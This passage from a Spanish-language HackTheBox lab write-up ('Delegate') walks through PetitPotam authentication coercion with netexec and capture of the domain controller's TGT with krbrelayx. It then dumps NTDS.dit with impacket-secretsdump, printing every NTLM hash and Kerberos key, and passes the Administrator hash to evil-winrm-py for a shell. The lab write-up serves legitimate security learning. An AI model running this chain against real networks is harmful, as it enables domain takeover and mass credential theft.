    El problema es que cualquier usuario autenticado puede llamar a `EfsRpcAddUsersToFile` y también puede especificar una ruta UNC como archivo objetivo a su vez esa ruta UNC puede apuntar a un archivo en un servidor que tu controlas.

    Entonces lo que sucede es algo asi: Usuario llama a `EfsRpcAddUsersToFile` y le dice al DC `Agrega un usuario a este archivo \\tuservidor\share\archivo.txt` -> El `DC` al momento de agregar el usuario a dicho archivo va a tratar de autenticarse contra nuestro servidor lo cual nos permite capturar esa autenticación.

Con el propio `netexexec` puedo forzar la autenticación utilizando PetitPotam.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/delegate]
└─$ netexec smb dc1.delegate.vl -u 'w0ndr$' -p 'w0nder11ng' -M coerce_plus -o LISTENER=w0ndr.delegate.vl METHOD=PetitPotam
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\w0ndr$:w0nder11ng
COERCE_PLUS 10.129.234.69   445    DC1              VULNERABLE, PetitPotam
COERCE_PLUS 10.129.234.69   445    DC1              Exploit Success, lsarpc\EfsRpcAddUsersToFile
```

Al momento de forzar la autenticación `krberlayx` captura la autenticación de la cuenta `DC$` y obtengo su TGT.

```bash
[*] Servers started, waiting for connections
[*] Setting up DNS Server
[*] Setting up HTTP Server on port 80
[*] SMBD: Received connection from 10.129.234.69
[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
[*] SMBD: Received connection from 10.129.234.69
[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
```

Puedo utilizar este TGT exportando la variable de entorno KRB5CCNAME y con `klist` puedo ver la propiedades del TGT:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/delegate]
└─$ export KRB5CCNAME='DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache'

┌──(wndr㉿wndr)-[~/Machines/hackthebox/delegate]
└─$ klist
Ticket cache: FILE:DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
Default principal: DC1$@DELEGATE.VL

Valid starting       Expires              Service principal
02/05/2026 07:28:42  02/05/2026 16:02:05  krbtgt/DELEGATE.VL@DELEGATE.VL
        renew until 02/12/2026 06:02:05
```

Con el TGT de la cuenta maquina del DC puedo dumpear el `ntds.dit`:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/delegate]
└─$ impacket-secretsdump -k -no-pass 'delegate.vl/DC1$@dc1.delegate.vl'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:54999c1daa89d35fbd2e36d01c4a2cf2:::
A.Briggs:1104:aad3b435b51404eeaad3b435b51404ee:8e5a0462f96bc85faf20378e243bc4a3:::
b.Brown:1105:aad3b435b51404eeaad3b435b51404ee:deba71222554122c3634496a0af085a6:::
R.Cooper:1106:aad3b435b51404eeaad3b435b51404ee:17d5f7ab7fc61d80d1b9d156f815add1:::
J.Roberts:1107:aad3b435b51404eeaad3b435b51404ee:4ff255c7ff10d86b5b34b47adc62114f:::
N.Thompson:1108:aad3b435b51404eeaad3b435b51404ee:4b514595c7ad3e2f7bb70e7e61ec1afe:::
DC1$:1000:aad3b435b51404eeaad3b435b51404ee:f7caf5a3e44bac110b9551edd1ddfa3c:::
wndr$:4601:aad3b435b51404eeaad3b435b51404ee:4d2d96052a6a103cd2a47db760b45e24:::
w0ndr$:4602:aad3b435b51404eeaad3b435b51404ee:56ade972b15b9bc68ada27ef0729c37c:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f877adcb278c4e178c430440573528db38631785a0afe9281d0dbdd10774848c
Administrator:aes128-cts-hmac-sha1-96:3a25aca9a80dfe5f03cd03ea2dcccafe
Administrator:des-cbc-md5:ce257f16ec25e59e
krbtgt:aes256-cts-hmac-sha1-96:8c4fc32299f7a468f8b359f30ecc2b9df5e55b62bec3c4dcf53db2c47d7a8e93
krbtgt:aes128-cts-hmac-sha1-96:c2267dd0a5ddfee9ea02da78fed7ce70
krbtgt:des-cbc-md5:ef491c5b736bd04c
A.Briggs:aes256-cts-hmac-sha1-96:7692e29d289867634fe2c017c6f0a4853c2f7a103742ee6f3b324ef09f2ba1a1
A.Briggs:aes128-cts-hmac-sha1-96:bb0b1ab63210e285d836a29468a14b16
A.Briggs:des-cbc-md5:38da2a92611631d9
b.Brown:aes256-cts-hmac-sha1-96:446117624e527277f0935310dfa3031e8980abf20cddd4a1231ebf03e64fee8d
b.Brown:aes128-cts-hmac-sha1-96:13d1517adfa91fbd3069ed2dff04a41b
b.Brown:des-cbc-md5:ce407ac8d95ee6f2
R.Cooper:aes256-cts-hmac-sha1-96:786bef43f024e846c06ed7870f752ad4f7c23e9fdc21f544048916a621dbceef
R.Cooper:aes128-cts-hmac-sha1-96:8c6da3c96665937b96c7db2fe254e837
R.Cooper:des-cbc-md5:a70e158c75ba4fc1
J.Roberts:aes256-cts-hmac-sha1-96:aac061da82ae9eb2ca5ca5c4dd37b9af948267b1ce816553cbe56de60d2fa32c
J.Roberts:aes128-cts-hmac-sha1-96:fa3ef45e30cf44180b29def0305baeb6
J.Roberts:des-cbc-md5:6858c8d3456451f4
N.Thompson:aes256-cts-hmac-sha1-96:7555e50192c2876247585b1c3d06ba5563026c5f0d4ade2b716741b22714b598
N.Thompson:aes128-cts-hmac-sha1-96:7ad8c208f8ff8ee9f806c657afe81ea2
N.Thompson:des-cbc-md5:7cab43c191a7ecf2
DC1$:aes256-cts-hmac-sha1-96:358880cace9d6c849f2069f2ac7582b18de5185b3c815b6728cb3542c0d25fa1
DC1$:aes128-cts-hmac-sha1-96:f922407dfc023ec95d458257224ce8d9
DC1$:des-cbc-md5:9e16cd46ad54cba7
wndr$:aes256-cts-hmac-sha1-96:98f59c848db3640c6c29e9c0b1044d253aa22af9a8a2e5a991625c0a81e34679
wndr$:aes128-cts-hmac-sha1-96:04d2fdb8c82b23ede3b28e0b11fc5a1a
wndr$:des-cbc-md5:f454df0d7cb6620e
w0ndr$:aes256-cts-hmac-sha1-96:5fab672d5206de70405cbf25c2972cf83b093e077a505ca2a7dc9efb5116f70e
w0ndr$:aes128-cts-hmac-sha1-96:0e65bda58c591466a3de5a4e4148fee5
w0ndr$:des-cbc-md5:b6a8ced6f8e585da
[*] Cleaning up...
```

Ahora puedo conectarme vía WinRm.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/delegate]
└─$ evil-winrm-py -i 10.129.234.69 -u administrator -H 'c32198ceab4cc695e65045562aa3ee93'
          _ _            _
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.5.0

evil-winrm-py PS C:\Users\Administrator\Documents> whoami
delegate\administrator
evil-winrm-py PS C:\Users\Administrator\Documents> cd ..
evil-winrm-py PS C:\Users\Administrator> cd Desktop
evil-winrm-py PS C:\Users\Administrator\Desktop> type root.txt
89bf3cdda09fc31b6883dc*****
```

***PWNED***

![](assets/Pasted%20image%2020260210161332.png)